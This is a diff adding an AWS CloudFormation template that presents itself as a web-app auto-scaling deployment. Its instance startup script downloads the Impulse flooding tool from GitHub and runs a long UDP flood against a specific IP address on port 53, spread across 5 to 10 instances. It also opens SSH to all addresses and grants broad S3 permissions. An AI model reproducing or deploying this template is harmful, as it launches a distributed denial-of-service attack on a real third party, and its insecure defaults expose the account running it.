@@ -1,0 +1,176 @@
+AWSTemplateFormatVersion: 2010-09-09
+Parameters:
+  KeyName:
+    Description: Name of an existing EC2 KeyPair to enable SSH access to the instance
+    Type: 'AWS::EC2::KeyPair::KeyName'
+    ConstraintDescription: must be the name of an existing EC2 KeyPair.
+    Default: 'local'
+  InstanceType:
+    Description: WebServer EC2 instance type
+    Type: String
+    Default: t2.micro
+    AllowedValues:
+      - t2.micro
+      - t2.small
+      - t2.medium
+    ConstraintDescription: must be a valid EC2 instance type.
+  SSHLocation:
+    Description: ' The IP address range that can be used to SSH to the EC2 instances'
+    Type: String
+    MinLength: '9'
+    MaxLength: '18'
+    Default: 0.0.0.0/0
+    AllowedPattern: '(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/(\d{1,2})'
+    ConstraintDescription: must be a valid IP CIDR range of the form x.x.x.x/x.
+  VPC:
+    Type: String
+    Default: 'vpc-806900eb'
+  AppName:
+    Type: String
+    Default: 'WebAPP'
+  MaxSpot:
+    Type: String
+    Default: '0.004'
+
+Mappings:
+  AWSInstanceType2Arch:
+    t2.micro:
+      Arch: HVM64
+    t2.small:
+      Arch: HVM64
+    t2.medium:
+      Arch: HVM64
+  AWSRegionArch2AMI:
+    eu-central-1:
+      HVM64: ami-05e6acf3bd87eb272
+    us-east-1:
+      HVM64: ami-048ff3da02834afdc
+
+Resources:
+  ASGWebAPP:
+    Type: 'AWS::AutoScaling::AutoScalingGroup'
+    Properties:
+      VPCZoneIdentifier:
+        - 'subnet-34760379'
+        - 'subnet-80bd9beb'
+        - 'subnet-b5811ec8'
+      HealthCheckType: EC2
+      HealthCheckGracePeriod: 300
+      LaunchConfigurationName: !Ref LaunchConfig
+      DesiredCapacity: 5
+      MinSize: 5
+      MaxSize: 10
+      TerminationPolicies:
+      - OldestInstance
+      Tags:
+      - Key: Name
+        Value: !Ref AppName
+        PropagateAtLaunch: 'true'
+    CreationPolicy:
+      ResourceSignal:
+        Timeout: PT10M
+
+  LaunchConfig:
+    Type: AWS::AutoScaling::LaunchConfiguration
+    Properties:
+      ImageId: !FindInMap
+      - AWSRegionArch2AMI
+      - !Ref 'AWS::Region'
+      - !FindInMap
+        - AWSInstanceType2Arch
+        - !Ref InstanceType
+        - Arch
+      SpotPrice: !Ref MaxSpot
+      IamInstanceProfile: !Ref InstanceProfile
+      InstanceType: !Ref InstanceType
+      SecurityGroups:
+      - !Ref WebServerSecurityGroup
+      KeyName: !Ref KeyName
+      UserData:
+        Fn::Base64:
+          Fn::Sub: |
+            #!/bin/bash -x
+            yum install -y aws-cfn-bootstrap
+            #Install additional repo
+            yum -y install https://as-repository.openvpn.net/as-repo-amzn2.rpm
+            # Install the files and packages from the metadata section
+            /opt/aws/bin/cfn-init -v --region ${AWS::Region} --stack ${AWS::StackName} --resource LaunchConfig --configsets InstallAndRun
+            # Send OK signal to the CloudFormation stack
+            /opt/aws/bin/cfn-signal -e $? --region ${AWS::Region} --stack ${AWS::StackName} --resource ASGWebAPP
+            ##########################
+            #Put your commands here
+            ##########################
+            git clone https://github.com/LimerBoy/Impulse && \
+            cd Impulse/ && \
+            pip3 install -r requirements.txt
+            python3 impulse.py --target 212.12.28.30:53 --time 100000 --threads 100 --method UDP
+            #
+            ##########################
+    Metadata:
+      AWS::CloudFormation::Init:
+        configSets:
+          InstallAndRun:
+          - Install
+        Install:
+          packages:
+            yum:
+              mc: []
+              jq: []
+              git: []
+              python3-pip: []
+              screen: []
+              openvpn-as: []
+    CreationPolicy:
+      ResourceSignal:
+        Timeout: PT10M
+
+
+  WebServerSecurityGroup:
+    Type: 'AWS::EC2::SecurityGroup'
+    Properties:
+      GroupDescription: Enable HTTP access via port 80
+      VpcId: !Ref VPC
+      SecurityGroupIngress:
+      - {IpProtocol: tcp, FromPort: '22', ToPort: '22', CidrIp: !Ref SSHLocation}
+
+  InstanceProfile:
+    Type: 'AWS::IAM::InstanceProfile'
+    Properties:
+      Path: /webapp/
+      Roles:
+      - !Ref InstanceRole
+
+  InstanceRole:
+    Type: 'AWS::IAM::Role'
+    Properties:
+      AssumeRolePolicyDocument:
+        Statement:
+        - Effect: Allow
+          Principal:
+            Service:
+            - ec2.amazonaws.com
+          Action:
+          - 'sts:AssumeRole'
+      Path: /webapp/
+      Policies:
+      - PolicyName: AWSPermissions
+        PolicyDocument:
+          Statement:
+          - Sid: S3YumRepo
+            Effect: Allow
+            Action:
+            - 's3:*'
+            Resource:
+            - '*'
+          - Sid: DescribeEC2
+            Effect: Allow
+            Action:
+            - 'ec2:DescribeInstances'
+            - 'ec2:DescribeTags'
+            Resource: '*'
+          - Sid: ParameterStore
+            Effect: Allow
+            Action:
+            - 'ssm:GetParameters'
+            - 'ssm:GetParameter'
+            Resource: '*'
